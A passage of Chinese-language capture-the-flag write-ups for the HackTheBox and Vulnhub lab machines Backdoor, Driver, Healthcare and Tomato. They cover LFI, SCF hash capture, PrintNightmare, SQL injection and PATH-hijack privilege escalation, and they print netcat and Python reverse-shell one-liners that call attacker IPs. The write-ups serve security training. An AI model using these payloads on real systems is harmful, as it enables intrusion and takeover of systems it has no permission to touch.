src="https://img-blog.csdnimg.cn/e95aaf54fdb343a199cf7ec03bc27d52.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们可以反弹一个root的shell到本机上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./exploit.py http://localhost:8000 Monolog/RCE1 <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.25 4445 &gt;/tmp/f&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/9d4a8f62eb834cb78ddc826a02de9132.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/db008ce7bfb14ce78f99c0d2534651e1.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>CMS</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Backdoor</title>
    <url>/2022/01/04/Backdoor/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现目标主机开放了ssh和web服务<br><img src="https://img-blog.csdnimg.cn/91c55463b8894dfc8281797fa545de3c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们将<code>backdoor.htb</code>添加到hosts文件中后，访问web服务，发现是一个WordPress页面，并且版本是<code>5.8.1</code><br><img src="https://img-blog.csdnimg.cn/fc20025359b542d092eda73dfd36dc39.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>既然是wordpress，那么我们可以直接使用wpscan来扫描存在哪些漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://backdoor.htb/ --api-token X4CFiaLdgwD6FwDMhkrZMpNjFDZ7Ex6DWqlcPM9DVic --enumerate p,u --plugins-detection aggressive</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/c7c8fb81233a4b49b06e3d757078c9dd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现存在一个组件漏洞，路径是<code>http://backdoor.htb/wp-content/plugins/akismet/</code>，我们访问其上一级目录发现是ebook的插件<br><img src="https://img-blog.csdnimg.cn/59ce377ff44443e0ae407e8028b768a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们在EDB上发现了这个组件存在目录穿越漏洞<br><img src="https://img-blog.csdnimg.cn/c15aaa1c2f99402aa234d95d4ba7d7ff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们访问其路径，并将wp-config.php文件下载保存下来，发现了mysql的用户名和密码<br><img src="https://img-blog.csdnimg.cn/9276f5329d5444d1a4e7f701f2b2b3e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>但是我们到后台进行登录时发现无论是<code>admin</code>和<code>wordpressuser</code>都是登陆失败的<br><img src="https://img-blog.csdnimg.cn/d7d52ae101994365b067e0463284ecec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们只能切换另一个思路了，上面我们说到时存在一个LFI漏洞的。我们可以使用LFISuite进行路径的检测<br><img src="https://img-blog.csdnimg.cn/12af5d4372a042a783fd87b77f83506d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们虽然可以找到passwd文件，但是并没有任何的作用<br><img src="https://img-blog.csdnimg.cn/be7eb457f68b4b6799558545455b690c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们可以查看目标主机都在运行那些进程，通过传入<code>/proc/pid/cmdline</code>这个路径参数，其中pid的值我们可以进行模糊，并用burpsuite进行抓包分析。其中为什么要这么做，这是Linux 文件系统层次结构的文章解析链接<a href="https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html">https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html</a><br><img src="https://img-blog.csdnimg.cn/bffa7223627d4dfe8db4b137b4984909.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2a11eb47eaea430685df1782909d56fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们发现进程号为793的进程，在本机的1337端口上运行这一个<code>gdbserver</code>这样一个程序<br><img src="https://img-blog.csdnimg.cn/f4483a61544247d282456891a4d1f1dc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h3><p>我们在EDB中发现了gdbserver这个程序是存在漏洞的<br><img src="https://img-blog.csdnimg.cn/abd8f238cf054450a79a3a3d13e79783.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们将其内容保存为exp.py文件，然后按照提示先生成一个rev.bin文件<br><img src="https://img-blog.csdnimg.cn/54d8c0fbe2bc4a9590f41b6770b2bee0.png" alt="在这里插入图片描述"><br>然后开启监听，运行我们的exp并获取目标主机的shell<br><img src="https://img-blog.csdnimg.cn/1da19bb296474d1fa28f040adfacede6.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6b571bba98c44cfe92c049f327069088.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h3 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h3><p>我们可以直接通过MSF程序获取目标主机的shell，并设置对应的参数项<br><img src="https://img-blog.csdnimg.cn/a0817ecc48414e04ba28a8126f1f05a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后提示这个payload运行错误，原因是主机并不是32位的，是64位的<br><img src="https://img-blog.csdnimg.cn/c9995cd3ea9b4b509c347aa0508635b0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们把参数设置为64位再运行即可<br><img src="https://img-blog.csdnimg.cn/5ab52ced97f449338a1cd14d20707741.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0950beedec5c4b9894654396d09fd96c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们将<code>linpeas.sh</code>这个文件上传到目标主机上并运行它<br><img src="https://img-blog.csdnimg.cn/ace832b109ac4ca391a07343bc66a62b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现存在这么一个可疑的进程是可能存在漏洞利用的<br><img src="https://img-blog.csdnimg.cn/9219d9c4acde429db32f97840917256e.png" alt="在这里插入图片描述"><br>我们使用pspy程序监听一下主机的进程<br><img src="https://img-blog.csdnimg.cn/a2824fa9dada431e948761bc432f95f6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现这个进程是每休眠一段时间就会再次运行，并且都是以root身份来运行的<br><img src="https://img-blog.csdnimg.cn/597c98a3121744a98ac64e76c51564aa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们可以看到我们现在使用的终端是dumb<br><img src="https://img-blog.csdnimg.cn/9e65175ae79346ecb3631d670afba0e1.png" alt="在这里插入图片描述"><br>我们要将其设置为xterm终端<br><img src="https://img-blog.csdnimg.cn/eab51c482a6c47ef9827e3de470b933f.png" alt="在这里插入图片描述"><br>然后查看screen的帮助命令发现，-x参数可以帮我们直接进入另一个终端界面，因为screen程序是以root身份运行的，所以我们能直接进入root终端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -x root/root</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/c8e276d5bacf4eeba50d6692a9160185.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>LFI</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Driver</title>
    <url>/2022/01/01/Driver/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现目标主机开放了web服务和SMB服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~&#x2F;Desktop]</span><br><span class="line">└─# bash nmap.sh 10.10.11.106                                                                                                                 1 ⚙</span><br><span class="line">Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-01 02:43 EST</span><br><span class="line">Nmap scan report for 10.10.11.106</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80&#x2F;tcp   open  http         Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;UTF-8).</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP&#x2F;1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm&#x3D;MFP Firmware Update Center. Please enter password for admin</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">135&#x2F;tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">5985&#x2F;tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">Service Info: Host: DRIVER; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-01-01T14:43:35</span><br><span class="line">|_  start_date: 2022-01-01T14:37:37</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3.1.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 53.61 seconds</span><br></pre></td></tr></table></figure>
<p>我们访问web服务时，提示我们要输入账号和密码，我们使用admin/admin登录成功</p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/c4d2b8fafacf4a7e83de610beea75a59.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>登录页面时发现是台打印机，我们点击<code>Fireware Updates</code>页面，发现类似文件上传的页面<br><img src="https://img-blog.csdnimg.cn/2e214c05a4a54abcba4a54c4b911d11f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><!--more-->

<p>我尝试了很久的文件上产webshell都没有成功，切换思路，既然目标主机开放了445端口和共享SMB服务，那么我们可以利用SCF文件攻击(虽然这种攻击方式很不常见)。我们首先先手动创建一个scf文件<br><img src="https://img-blog.csdnimg.cn/5d503addbbcf4fd683f0a1c02274294e.png" alt="在这里插入图片描述"><br>然后启动responder程序进行监听<br><img src="https://img-blog.csdnimg.cn/c906af81139e4e569a4ca96169bb3d3f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们上传我们写的shell.scf文件，上传成功后会出现一个tony用户的哈希值，加密的方式是<code>NTLMv2</code><br><img src="https://img-blog.csdnimg.cn/4b75787e99934dc8986ba6a5d124e686.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用hashcat对这个哈希值进行破解，破解得到的密码是<code>liltony</code><br><img src="https://img-blog.csdnimg.cn/b4ae03ebc9e441cb81c41063bde7d8f7.png" alt="在这里插入图片描述"><br>我们使用这个账号密码进行登录，得到了普通用户的权限<br><img src="https://img-blog.csdnimg.cn/ac151987bd374eeb9178da89785bfe70.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们查看到存在<code>spoolsv</code>这个进程，这是一个<code>Windows Print Spooler</code>服务，存在一个CVE漏洞编号，对应的CVE编号是<code>CVE-2021-1675</code><br><img src="https://img-blog.csdnimg.cn/235805f980cf43c68a8fc68310f5bcf3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在目标主机上远程加载我们的powershell脚本，并且使用脚本创建一个匿属管理员组的用户<br><img src="https://img-blog.csdnimg.cn/1b8333a9b0734baabe95425606940b95.png" alt="在这里插入图片描述"><br>添加成功后，我们可以使用这个账户密码进行登录了，权限是管理员权限<br><img src="https://img-blog.csdnimg.cn/a778b21f88954011b0a534250f909205.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Windows Print Spooler</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Healthcare</title>
    <url>/2021/12/26/Healthcare/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现目标主机开放了ftp和web服务，并且扫描出了不允许访问的几个目录<br><img src="https://img-blog.csdnimg.cn/5dbfa03fea4c49f1a2b08c27a605fbcc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们分别访问这几个目录，发现只有一个目录可以正常访问，其他目录都显示404状态码<br><img src="https://img-blog.csdnimg.cn/856663a863cd441ca9ca6d8e62e83129.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d0a8cae2057141059254c7688269f92c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们没发现任何有价值的信息，那么就fuzz一下路径吧，发现存在一个openemr路径，进入后发现是后台登录页面</p>
<span id="more"></span>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u &quot;http:&#x2F;&#x2F;192.168.101.200&quot; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-2.3-big.txt -e 404,403,500</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/62eb523aa913490cb9772221e6da1687.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ffb2f3248388447cbbbb28ff1fe1f4fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>看到post表单，条件反射验证是够存在SQL注入漏洞，使用burpsuite抓包并使用sqlmap进行注入<br><img src="https://img-blog.csdnimg.cn/9fc387f225fb434d9189cf499ec9fd96.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们对数据库进行注入<br><img src="https://img-blog.csdnimg.cn/b71794267f1340b2bd79b21e04a19913.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看存在users表<br><img src="https://img-blog.csdnimg.cn/786a517b4ae94a70998658329530e0ad.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>发现users表里存在username和password两个字段<br><img src="https://img-blog.csdnimg.cn/3ad57acd36ea44a6965f90f1200a4b83.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>注入发现了两个用户名和密码，我们分别尝试登录ftp，发现使用medical账号可以登录成功<br><img src="https://img-blog.csdnimg.cn/5f4e0f07bb7540f4b112b1c1d3b46062.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d996972aacfe4e6f8988bca089b13a40.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们将payload上传到<code>/var/www/html/openemr</code>目录中，并进行访问<br><img src="https://img-blog.csdnimg.cn/8b9e1beafa41414a8d24428ffd10e758.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们切换到medical用户上，并查找可以执行的二进制文件<code>find / -perm -4000 2&gt;/dev/null</code><br><img src="https://img-blog.csdnimg.cn/38be5967b2204505b7abd5d0fbb30704.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们发现<code>/usr/bin/healthcheck</code>文件是比较容易受到攻击的程序，它只是运行了一堆标准的linux程序，比较明显的是<code>fdisk -l</code>这个程序<br><img src="https://img-blog.csdnimg.cn/53728f3d36a841d1a02a990f9a6c58c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们输入以下常见的提权操作，先将/bin/bash命令写入到fdisk程序中，并将其导入到medical用户的执行路径中，添加执行权限并拿取root权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; fdisk</span><br><span class="line">chmod +x fdisk</span><br><span class="line">export PATH&#x3D;&#x2F;home&#x2F;medical:$PATH</span><br><span class="line">echo $PATH</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;healthcheck</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/cda20fb3c5914ceaa4d13a6d3a7adf62.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>SQL注入漏洞</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomato</title>
    <url>/2021/12/24/Tomato/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>运行我们的bash脚本，发现目标系统开放了ftp和web服务<br><img src="https://img-blog.csdnimg.cn/b2f1b07f20b74e8cbbf09d8aceb93286.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们尝试是否可以匿名登录ftp，未果<br><img src="https://img-blog.csdnimg.cn/074a7cd93bf64ed3aa33a1e7ba57281e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>我们访问web服务，发现是一个番茄图片，查看源码也没什么发现</p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/6fbb54145b634516a076f26d15d098ad.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>我们fuzz一下路径，发现了存在一个antibot_image路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.101.197/&quot;</span> -e * -x404,500,403 -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/fa0487042a3d48909ab79d96a12532a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>我们发现存在一个info.php文件<br><img src="https://img-blog.csdnimg.cn/a59aa7bf23b2400cb4fd41b01cea33d7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>文件的源码提示我们存在文件包含漏洞<br><img src="https://img-blog.csdnimg.cn/39d170ef77ee482988bbfd4d37ecc20b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们验证漏洞确实是真实存在的<br><img src="https://img-blog.csdnimg.cn/b6bee6c21fc2499999963c8682e6f3cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们尝试将一句话写进日志文件中，日志文件的路径为<code>/var/log/auth.log</code>，发现已被写入日志并成功执行我们的命令<br><img src="https://img-blog.csdnimg.cn/8fc98d199a4845c1a5e8d72245c7b934.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bf1f3a8f67a6457998b22f5bd225ccc2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们就可以查找python是否存在，若存在则可以反弹shell到我们本地的机子上。可以看到python是存在的，并且版本为3.5<br><img src="https://img-blog.csdnimg.cn/4d606cef990543d381d880d6a94f170c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们将执行如下的payload添加到cmd参数后获得一个shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.101.196&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/8ac1207e853b4bfa8655671b22b4939d.png" alt="在这里插入图片描述"></p>
